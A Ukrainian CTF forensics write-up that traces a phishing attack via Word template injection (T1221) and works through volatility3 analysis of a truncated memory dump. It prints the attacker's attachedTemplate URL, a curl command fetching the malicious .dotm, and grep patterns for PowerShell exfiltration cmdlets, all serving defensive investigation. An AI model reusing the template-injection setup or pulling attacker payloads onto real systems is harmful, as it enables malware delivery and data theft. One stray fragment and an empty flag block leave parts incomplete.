## Підзадача 1: Find the link ✅ (повністю вирішено в чаті)

**Ціль:** знайти посилання на macro-enabled template.

### Крок 1 — розпакувати листи

```bash
unzip -o emails.zip -d emails
```

### Крок 2 — пошук посилань у листах (перша спроба, неповна)

```bash
grep -Eo 'https?://[^"'"'"'>\s]+' emails/*.eml
```

**Проблема:** знайшло лише обрізаний лінк (`https://go.micro...`). Причина — HTML-листи закодовані частково через MIME quoted-printable, а сирий `.eml`-файл містить технічні заголовки і "сире" MIME-тіло, яке не можна коректно грепати напряму.

### Крок 3 — правильне декодування MIME через Python

```python
import email
from email import policy
msg = email.message_from_file(open(path), policy=policy.default)
for part in msg.walk():
    if part.get_content_type() in ('text/plain', 'text/html'):
        print(part.get_content())
```

**Пояснення:** модуль `email` з `policy=policy.default` сам розбирає багаточастинний (multipart) лист, декодує quoted-printable/base64 і повертає вже "чистий" текст/HTML кожної частини.

### Крок 4 — знову пошук лінків (у декодованому тексті)

Проблема з переносом рядка всередині `href="..."` (HTML фізично "розбитий" на рядки):

```bash
tr -d '\n' < decoded.txt | grep -Eo 'https?://[^"'"'"'<>[:space:]]+'
```

`tr -d '\n'` склеює файл в один рядок перед пошуком, щоб regex не обривався на переносі.

**Результат:** знайдено лише службовий лінк `https://go.microsoft.com/fwlink/?LinkId=550986` (це стандартний підпис Outlook "Sent from Mail for Windows" — не шкідливий).

### Крок 5 — перевірка вкладень у листах

```python
for part in msg.walk():
    fn = part.get_filename()
    if fn:
        print('ATTACHMENT:', fn, part.get_content_type())
```

**Знайдено 2 вкладення:**
- `best_deal_ever.xlsx`
- `Financely Business Proposal.docx`

### Крок 6 — перевірка вкладень на прямі VBA-макроси

```bash
olevba attachments/*.docx attachments/*.xlsx
```

**Результат:** прапорець `M` (macros) відсутній — файли "чисті" OOXML без вбудованого VBA. Це і є ключова ознака: зловмисник **навмисно** не поклав макрос прямо у файл, щоб обійти антивірусні фільтри пошти.

### Крок 7 — пошук зовнішніх посилань у структурі OOXML-файлу

`.docx`/`.xlsx` — це насправді ZIP-архіви. Розпаковуємо і дивимось на relationships (`_rels/*.rels`):

```bash
unzip -o "Financely Business Proposal.docx" -d docx_extracted
cat docx_extracted/word/_rels/*.rels | tr '>' '>\n' | grep -i target
```

**Знайдено в `settings.xml.rels`:**
```xml
<Relationship Type=".../attachedTemplate"
  Target="https://free-games-ua.s3.eu-central-1.amazonaws.com/mal_temp.dotm"
  TargetMode="External"/>
```

**Пояснення техніки (MITRE ATT&CK T1221 — Template Injection):** у `.docx` є спеціальний тип зв'язку `attachedTemplate` — посилання на шаблон (`.dotm`), який Word підвантажує **автоматично при відкритті документа**. Сам `.docx` при цьому чистий (проходить фільтри), а весь шкідливий VBA-код сидить у зовнішньому `.dotm`, який завантажується з інтернету вже після того, як лист і вкладення пройшли перевірку.

### Прапор

```

```

## Підзадача 2: TCP connections 📝 (відповідь відома, метод — типовий підхід)

**Відповідь команди:** `UR{4}`

Цю підзадачу в чаті не розв'язували покроково (відповідь знайшли інші учасники команди). Типові підходи:

**Якщо є PCAP** (мережевий трафік):
```bash
tshark -r traffic.pcap -Y "ip.addr == <IP S3-бакета>" -T fields -e tcp.stream | sort -u | wc -l
```
Рахуємо кількість **унікальних TCP-стрімів** (`tcp.stream`) до IP-адрес Amazon S3, а не кількість пакетів.

**Якщо тільки дамп пам'яті** (через volatility3):
```bash
vol -f memdump.raw windows.netscan
```
`windows.netscan` сканує пам'ять за характерними структурами мережевих з'єднань (`TCP_ENDPOINT`/`TCP_LISTENER`) і показує локальні/віддалені адреси, порти, стан з'єднання, PID процесу-власника — незалежно від того, чи "живий" ще список процесів. Фільтруємо за IP/доменом S3-бакета і рахуємо ESTABLISHED-записи.

⚠️ У наданому нам наборі файлів PCAP не було (лише `emails.zip` + `memdump.raw`), тож команда, ймовірно, використала `windows.netscan`.

## Підзадача 3: Find the process Id 📝 (відповідь відома, метод — типовий підхід)

**Відповідь команди:** `UR{7140}`

Типовий підхід через volatility3:

```bash
vol -f memdump.raw windows.pslist
# або дерево процесів:
vol -f memdump.raw windows.pstree
```

- `windows.pslist` — проходить по зв'язаному списку процесів ядра Windows (`PsActiveProcessHead`) і виводить PID, PPID, ім'я процесу, час створення тощо.
- `windows.pstree` — те саме, але у вигляді дерева (видно, який процес кого запустив — це корисно, щоб побачити, що саме WINWORD.EXE згодом запустив powershell.exe).

Шукаємо рядок з `WINWORD.EXE` — колонка PID і буде відповіддю. Додатково можна звірити через:
```bash
vol -f memdump.raw windows.cmdline
```
щоб побачити повний командний рядок процесу (шлях до відкритого `.docx`).

## Підзадача 4: Which file was stollen ⚠️ (не завершено в чаті — цінний урок з діагностики)

Тут ми зіткнулись із серйозною проблемою інструментарію і не встигли дійти до прапору. Але сам процес діагностики — важливий урок для наступних змагань.

### Крок 1 — спроба стандартного підходу (не спрацювала)

```bash
vol -f memdump.raw windows.pstree
vol -f memdump.raw windows.cmdline
```

**Результат:** обидві команди повернули **порожню таблицю** (жодного процесу), без явних помилок.

### Крок 2 — перевірка через альтернативний плагін

```bash
vol -f memdump.raw windows.psscan
```

`windows.psscan` (на відміну від `pslist`) не йде по зв'язаному списку процесів, а сканує всю фізичну пам'ять за характерними pool-тегами структур `EPROCESS`. Це стійкіше до пошкодження/розірвання списку процесів (наприклад, коли малварь намагається "приховати" процес).

**Результат:** також порожньо. Це вже сигнал, що проблема не в "прихованому процесі", а глибше — на рівні самого файлу дампу.

### Крок 3 — груба спроба через рядки пам'яті (і чому вона оманлива)

```bash
strings -a memdump.raw | grep -Ei 'Invoke-WebRequest|Invoke-RestMethod|Net.WebClient|UploadFile|Compress-Archive|amazonaws'
```

**Важливий урок:** цей греп видав **сотні рядків** з посиланнями на зовсім різні шкідливі домени, IP і техніки — але це виявилось **не слідами реальної атаки**, а базою сигнатур Windows Defender (список відомих IOC шкідливого ПЗ), яка просто лежить у пам'яті працюючого антивіруса. Впізнати це можна за тим, що:
- рядки йдуть **без пробілів** (внутрішній формат сигнатурної бази для швидкого пошуку);
- домени/URL абсолютно не пов'язані між собою і з контекстом задачі.

**Висновок:** сліпий grep по рядках дампу пам'яті — небезпечний метод, легко переплутати реальні артефакти атаки з базою сигнатур антивіруса чи іншим "шумом". Краще спиратись на структуровані плагіни volatility (`pslist`, `cmdline`, `netscan` тощо), які інтерпретують саме структури ОС, а не сирий текст.

### Крок 4 — спроба обхідного шляху: завантажити сам шкідливий шаблон

Оскільки лінк на `.dotm`-шаблон публічний (з підзадачі 1), спробували завантажити його напряму — макрос міг містити захардкоджений шлях до файлу-жертви:

```bash
curl -v -o mal_temp.dotm "https://free-games-ua.s3.eu-central-1.amazonaws.com/mal_temp.dotm"
```

**Результат:** `HTTP/1.1 404 Not Found` — файл вже видалили з S3-бакета (типово для CTF: інфраструктура "жива" обмежений час). Шлях відпав.

### Крок 5 — справжня причина: дамп пам'яті виявився обрізаним

Повернулись до діагностики самого файлу `memdump.raw` через `readelf` (формат файлу — **ELF core dump**, типовий для дампів, знятих через QEMU `dump-guest-memory`):

```bash
file memdump.raw
readelf -h memdump.raw
readelf -l memdump.raw
```

**Пояснення формату:** ELF core dump пам'яті складається із заголовка (`Program Headers`) — списку сегментів (`LOAD`), де для кожного вказано:
- `Offset` — де в файлі лежать дані цього сегменту;
- `PhysAddr` — якій фізичній адресі пам'яті гостьової машини це відповідає;
- `FileSiz`/`MemSiz` — розмір даних у файлі / розмір у пам'яті (якщо `FileSiz < MemSiz` — це "діра", ділянка нулів, яку не зберігали для економії місця).

Порахували python-скриптом очікуваний мінімальний розмір файлу (`Offset + FileSiz` останнього сегменту):

```python
import subprocess
out = subprocess.check_output(['readelf','-l','memdump.raw']).decode()
lines = out.splitlines()
max_end = 0
for i, l in enumerate(lines):
    if l.strip().startswith('LOAD'):
        off = int(l.split()[1], 16)
        filesz = int(lines[i+1].split()[0], 16)
        end = off + filesz
        max_end = max(max_end, end)
print('Expected minimal file size:', max_end)
```

**Результат:**
- Очікуваний розмір файлу (за заголовками): **~10 541 218 896 байт (~10.5 GB)**
- Реальний розмір файлу: **2 102 919 168 байт (~2.1 GB)**
- Бракує: **~8.4 GB**

**Висновок:** файл `memdump.raw` **обрізаний/недокачаний** приблизно на 80% — саме тому жоден з процес-орієнтованих плагінів volatility нічого не знаходить: структури `EPROCESS`, ланцюжок процесів, командні рядки тощо фізично відсутні у тій частині файлу, яка є в наявності. Перевірка `md5sum` показала, що копія у WSL і на диску C ідентичні — тобто файл обірвався ще на етапі його **первинного отримання/завантаження на комп'ютер**, а не під час копіювання в WSL.

### Наступні кроки (не виконані в цьому чаті)

1. Перезавантажити `memdump.raw` заново з джерела CTF-платформи (не з локальної копії).
2. Перевірити, що новий файл суттєво більший (орієнтовно ~10.5 GB).
3. Повторити `windows.pslist` / `windows.pstree` / `windows.cmdline` на повному файлі.
4. Знайти дочірній процес `powershell.exe`, породжений `WINWORD.EXE` (PID 7140) — саме він виконує ексфільтрацію.
5. У командному рядку цього powershell-процесу шукати патерни на кшталт `Compress-Archive`, `Copy-Item`, `Invoke-WebRequest -InFile`, `-Method PUT`/`POST` — там і буде повний шлях файлу-жертви (відповідь на прапор).
6. Якщо командний рядок закодований (`-EncodedCommand` + base64) — декодувати: `base64 -d | iconv -f utf-16le`.

**Практичний урок на майбутнє:** перед тим, як довго дебажити інструмент (Volatility3, Wireshark тощо), яка "нічого не знаходить" — спершу перевір цілісність вхідного файлу (порівняй розмір із очікуваним, перевір контрольну суму, перевір структуру заголовків формату). Це рятує години часу.

мережевий exfiltration-трафік (наприклад, `Invoke-WebRequest`/`PUT`/`POST`
з підзадачі 4) там може бути видно напряму, без реконструкції з пам'яті.

## Підзадача 5: Find the content of the stolen file ⚠️ (не розглядалось у чаті)

Ця підзадача в чаті не розглядалась взагалі — вона логічно йде після підзадачі 4 (спочатку знаходимо **шлях** до вкраденого файлу, потім — його **вміст**).

**Типовий підхід (для майбутніх спроб):** якщо PowerShell-скрипт читав файл у пам'ять перед відправкою (наприклад, через `Get-Content` чи `[System.IO.File]::ReadAllBytes`), вміст файлу може лишитись у пам'яті процесу `powershell.exe`. Варіанти пошуку:

```bash
# дамп пам'яті конкретного процесу powershell.exe (за PID з підзадачі 4)
vol -f memdump.raw -o dump_ps windows.memmap --pid <PID> --dump

# пошук читабельного тексту в дампі цього процесу
strings dump_ps/*.dmp | less
```

Якщо дані передавались у зашифрованому/закодованому вигляді (base64, AES тощо) — доведеться додатково декодувати/розшифровувати, залежно від того, що покаже командний рядок PowerShell з підзадачі 4.
